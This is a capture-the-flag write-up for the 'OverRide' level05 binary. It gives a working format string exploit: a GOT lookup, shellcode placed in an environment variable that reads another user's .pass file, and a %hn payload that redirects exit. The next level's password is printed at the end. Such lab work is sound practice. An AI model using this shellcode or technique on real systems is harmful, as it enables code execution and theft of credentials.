In this level, we will use a format string attack to execute our shellcode, which we will add to our environment instead of the exit function.

```c
printf(&var_78);
exit(0);
```

To do this, we will first retrieve the address of the exit function in da GOT.
```
level05@OverRide:~$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit  <-------------
080497e4 R_386_JUMP_SLOT   __libc_start_main
```


Add our shellcode here; I'm using the shellcode from the previous level.
```
export EXPLOIT=$(python -c 'print("\x90" * 200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")')
```
Find the address of the environment variable.

```
0xffffd85d
```

Normally, we could have done print(exit_addr + %adr_shellcode_in_decimald%10$n), but adr_shellcode_in_decimal is 4294957148, which is rather long. So, we will do it differently; we will write 2 bytes at a time.
```
level05@OverRide:~$ ./level05
aaaabbbb%10$x%11$x
aaaabbbb6161616162626262
```
We will replace the 'a' above with 080497e0 and the 'b' with 080497e2.
Since we are in little-endian, we will first write the 2 low bytes and then the high ones

```
0xffffd85d

ffff = 65535 high
D85D = 55389 low
```

So for the low bytes, we will write 55388 - 8 into \xe0\x97\x04\x08. We subtract 8 because we will write the target addresses.
And for the high bytes we make a simple substraction 65535 - 55389 = 10146 Because, by the time we write the higher bytes, we would have already written the lower ones, and since %n counts the number of bytes already written, we will perform a subtraction to eliminate the bytes already written.

This gives us the final result:
```
level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55381d%10$hn" + "%10146d%11$hn")' | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
